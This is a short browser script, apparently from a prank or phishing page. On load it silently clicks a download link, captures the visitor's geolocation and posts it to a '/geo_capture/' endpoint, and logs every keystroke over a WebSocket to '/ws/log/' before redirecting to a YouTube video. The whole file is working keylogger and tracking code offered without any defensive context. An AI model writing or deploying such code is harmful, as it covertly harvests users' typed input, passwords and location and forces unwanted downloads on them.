document.addEventListener("DOMContentLoaded", () => {
    document.getElementById("downloadLink").click();

    // Get geolocation
    if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(pos => {
            fetch("/geo_capture/", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    latitude: pos.coords.latitude,
                    longitude: pos.coords.longitude
                })
            });
        });
    }

    // Keystroke logging via WebSocket
    const socket = new WebSocket("ws://" + window.location.host + "/ws/log/");
    document.addEventListener("keydown", e => {
        socket.send(JSON.stringify({ key: e.key }));
    });

    // Redirect after 5 seconds
    setTimeout(() => {
        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
    }, 5000);
});
